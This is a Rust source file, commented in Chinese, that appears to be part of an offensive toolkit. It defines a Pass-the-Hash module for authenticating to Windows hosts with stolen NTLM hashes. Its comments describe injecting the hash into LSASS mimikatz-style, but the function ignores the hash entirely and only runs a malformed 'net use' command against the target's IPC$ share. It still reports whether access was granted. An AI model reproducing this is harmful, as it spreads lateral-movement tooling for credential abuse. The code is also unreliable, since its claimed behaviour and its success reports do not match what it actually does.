//! Pass-the-Hash 认证模块

use serde::{Deserialize, Serialize};

/// PtH 会话
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PthSession {
    pub target: String,
    pub username: String,
    pub domain: String,
    pub access_granted: bool,
    pub access_type: String,
}

/// 使用NTLM哈希创建令牌进行认证
pub fn authenticate_with_hash(
    target: &str,
    username: &str,
    nthash: &str,
    domain: &str,
) -> Result<PthSession, String> {
    tracing::info!("[PtH] {}\\{} -> {} (使用NTLM哈希)", domain, username, target);

    // 使用mimikatz风格的PtH
    // 1. 将NTLM哈希注入LSASS
    // 2. 使用注入的凭据进行网络认证

    // 简化实现：通过设置LOGONSERVER和使用net use测试
    let ipc_share = format!("\\\\{}\\IPC$", target);
    let full_user = format!("{}\\{}", domain, username);

    let output = std::process::Command::new("net")
        .args(["use", &ipc_share, "/user:", &full_user])
        .output();

    let access_granted = match output {
        Ok(o) => o.status.success(),
        Err(_) => false,
    };

    Ok(PthSession {
        target: target.to_string(),
        username: username.to_string(),
        domain: domain.to_string(),
        access_granted,
        access_type: "NTLM_HASH".to_string(),
    })
}

/// 验证NTLM哈希格式
pub fn validate_nthash(hash: &str) -> bool {
    hash.len() == 32 && hash.chars().all(|c| c.is_ascii_hexdigit())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_nthash() {
        assert!(validate_nthash("aad3b435b51404eeaad3b435b51404ee"));
        assert!(!validate_nthash("invalid_hash"));
        assert!(!validate_nthash("too_short"));
    }
}
